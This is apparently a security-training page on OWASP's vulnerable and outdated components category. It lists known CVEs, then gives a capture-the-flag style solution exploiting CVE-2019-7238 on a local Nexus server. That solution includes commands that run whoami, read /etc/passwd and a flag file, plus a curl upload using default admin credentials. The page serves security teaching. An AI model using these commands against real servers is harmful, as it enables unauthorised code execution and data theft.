---
icon: diamonds-4
---

# A06 - Vulnerable and Outdated Components

This category highlights the risk associated with using vulnerable and outdated components. These components often run with the same privileges as the main application, increasing the potential impact if a vulnerability is exploited. The vulnerability may be unintentional or intentionally introduced by malicious actors.

#### Examples of Known Exploitable Component Vulnerabilities

* **CVE-2017-5638** (Apache Struts 2)
* **Heartbleed** (CVE-2014-0160)
* **Drupalgeddon** (CVE-2014-3704)
* **Shellshock** (CVE-2014-6271, CVE-2014-7169)
* **Log4j2** (CVE-2021-44228)

For a comprehensive list of current security advisories, consult the **French National Cybersecurity Agency's (CERT-FR)** alert and response center.

Attackers often leverage automated tools, such as **Shodan**, an IoT search engine, to scan for and locate misconfigured or outdated systems that are left vulnerable to attack.

**Real-World Example: Nexus Repository Manager**

For instance, a **Nexus Repository Manager** may have known vulnerabilities, like **CVE-2019-7238**. An attacker could exploit this CVE to gain unauthorized access to the system or retrieve sensitive information.

Another example is **Confluence** with multiple vulnerabilities. For a list of vulnerabilities associated with Confluence Server 6.10.2, see the CVE Details resource.

#### Additional Resources

* **CVE Details**: A comprehensive CVE database with detailed information on vulnerabilities.
* **End-of-Life Dates for Software**: Ensures awareness of critical updates and support timelines.

### Solution

In this scenario, we found that the **Nexus Server** is vulnerable to **CVE-2019-7238**. We can exploit this vulnerability using the following script:

```bash
python3 CVE-2019-7238.py http://localhost:8081/ whoami
python3 CVE-2019-7238.py http://localhost:8081/ "cat /etc/passwd"
python3 CVE-2019-7238.py http://localhost:8081/ "cat /etc/flag.txt"
```

After executing these commands, we successfully retrieve the flag.

If the initial approach does not succeed, try uploading a file using the following `curl` command:

```url
curl -v -u admin:admin123 --upload-file /tmp/pom.xml http://localhost:8081/repository/maven-releases/org/foo/1.0/foo-1.0.pom > /dev/null 2>&1
```

This command may bypass certain restrictions, allowing for file upload and further exploitation.
